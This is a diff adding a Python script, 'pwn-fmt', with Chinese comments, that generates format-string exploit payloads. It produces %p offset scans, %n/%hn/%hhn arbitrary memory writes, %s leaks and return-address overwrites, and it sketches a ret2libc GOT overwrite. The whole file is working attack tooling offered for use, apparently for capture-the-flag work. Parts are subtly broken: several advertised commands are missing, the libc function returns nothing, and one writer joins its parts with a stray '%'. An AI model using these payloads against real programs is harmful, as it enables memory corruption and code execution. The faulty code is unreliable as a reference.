@@ -1,0 +1,162 @@
+#!/usr/bin/env python3
+"""pwn-fmt: 格式串payload生成器
+用法:
+    pwn-fmt --scan <len> <start_idx>           # 扫描偏移(%p)
+    pwn-fmt --write <addr> <val> <start_idx>   # 写任意值(%n)
+    pwn-fmt --write-addr <addr> <start_idx>    # 写地址(%s)
+    pwn-fmt --leak <addr> <start_idx>          # 读内存(%s)
+    pwn-fmt --stack <func_addr> <start_idx>    # 覆写返回地址
+    pwn-fmt --libc <system_off> <binsh_off> <start_idx>  # ret2libc payload
+"""
+import struct, sys
+
+def pad_to_align(data, alignment=8):
+    return data + b'\x00' * ((alignment - len(data) % alignment) % alignment)
+
+def scan_payload(length, start=6):
+    """生成%p扫描偏移"""
+    parts = [f".%{i}$p" for i in range(start, start + length)]
+    return (''.join(parts)).encode()
+
+def write_byte(addr, byte_val, start=6):
+    """用%hhn写1字节"""
+    addrs = bytearray(struct.pack('<Q', addr))
+    fmt = f"%{byte_val}c%{start}$hhn"
+    return addrs + fmt.encode()
+
+def write_qword(addr, value, start=6):
+    """用%hn写8字节(分4次2字节写入)"""
+    addrs = bytearray()
+    fmt_parts = []
+    prev = 0
+    
+    shorts = []
+    for i in range(4):
+        s = (value >> (i * 16)) & 0xFFFF
+        shorts.append((s, addr + i * 2))
+    
+    # 按值排序以减少输出
+    shorts.sort()
+    
+    idx = start
+    for val, a in shorts:
+        addrs.extend(struct.pack('<Q', a))
+        diff = (val - prev) % 0x10000
+        if diff > 0:
+            fmt_parts.append(f"%{diff}c%{idx}$hn")
+        else:
+            fmt_parts.append(f"%{idx}$hn")
+        prev = val
+        idx += 1
+    
+    return addrs + ('%'.join(fmt_parts)).encode()
+
+def write_qword_byte(addr, value, start=6):
+    """用%hhn逐字节写8字节"""
+    addrs = bytearray()
+    fmt_parts = []
+    prev = 0
+    
+    for i in range(8):
+        byte_val = (value >> (i * 8)) & 0xFF
+        addrs.extend(struct.pack('<Q', addr + i))
+        diff = (byte_val - prev) % 256
+        if diff > 0:
+            fmt_parts.append(f"%{diff}c%{start + i}$hhn")
+        else:
+            fmt_parts.append(f"%{start + i}$hhn")
+        prev = byte_val
+    
+    return addrs + ('%'.join(fmt_parts)).encode()
+
+def leak_payload(addr, start=6):
+    """用%s泄露内存"""
+    payload = struct.pack('<Q', addr)
+    payload += f"%{start}$s".encode()
+    return payload
+
+def stack_overwrite(func_addr, start=6):
+    """覆写返回地址为func_addr"""
+    payload = bytearray(8)  # placeholder for saved rbp
+    payload.extend(struct.pack('<Q', func_addr))
+    return bytes(payload), start + 1  # +1 for padding
+
+def libc_payload(system_off, binsh_off, start=6):
+    """生成ret2libc的rop chain"""
+    # 简化: 假设已知 libc base, 需要自己填充
+    payload = bytearray()
+    payload.extend(b'AAAA' * 2)  # padding to ret
+    print(f"[*] 需要知道 libc base 地址")
+    print(f"[*] system offset: 0x{system_off:x}")
+    print(f"[*] /bin/sh offset: 0x{binsh_off:x}")
+    print(f"[*] payload: [padding] + [pop rdi; ret] + [/bin/sh addr] + [system addr]")
+    print(f"[*] 格式串写入: 覆写 GOT printf -> system")
+    return b''
+
+def main():
+    if len(sys.argv) < 2:
+        print(__doc__)
+        sys.exit(1)
+    
+    cmd = sys.argv[1]
+    
+    if cmd == '--scan':
+        length = int(sys.argv[2]) if len(sys.argv) > 2 else 20
+        start = int(sys.argv[3]) if len(sys.argv) > 3 else 6
+        payload = scan_payload(length, start)
+        print(f"[*] Scan {length} args from ${start}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload + b'\n')
+        print(f"[*] Preview: {payload.decode(errors='replace')}")
+    
+    elif cmd == '--write':
+        if len(sys.argv) < 5:
+            print("[-] Usage: pwn-fmt --write <addr_hex> <val_hex> <start_idx>")
+            sys.exit(1)
+        addr = int(sys.argv[2], 16)
+        val = int(sys.argv[3], 16)
+        start = int(sys.argv[4])
+        payload = write_qword_byte(addr, val, start)
+        print(f"[*] Write 0x{val:x} -> 0x{addr:x}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload + b'\n')
+    
+    elif cmd == '--write-short':
+        if len(sys.argv) < 5:
+            print("[-] Usage: pwn-fmt --write-short <addr_hex> <val_hex> <start_idx>")
+            sys.exit(1)
+        addr = int(sys.argv[2], 16)
+        val = int(sys.argv[3], 16)
+        start = int(sys.argv[4])
+        payload = write_qword(addr, val, start)
+        print(f"[*] Write 0x{val:x} -> 0x{addr:x} (using %hn)")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload + b'\n')
+    
+    elif cmd == '--leak':
+        addr = int(sys.argv[2], 16)
+        start = int(sys.argv[3]) if len(sys.argv) > 3 else 6
+        payload = leak_payload(addr, start)
+        print(f"[*] Leak memory at 0x{addr:x}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload + b'\n')
+    
+    elif cmd == '--write-byte':
+        addr = int(sys.argv[2], 16)
+        val = int(sys.argv[3], 16)
+        start = int(sys.argv[4]) if len(sys.argv) > 4 else 6
+        payload = write_byte(addr, val, start)
+        print(f"[*] Write byte 0x{val:x} -> 0x{addr:x}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload + b'\n')
+    
+    elif cmd == '--help' or cmd == '-h':
+        print(__doc__)
+    
+    else:
+        print(f"[-] Unknown command: {cmd}")
+        print(__doc__)
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
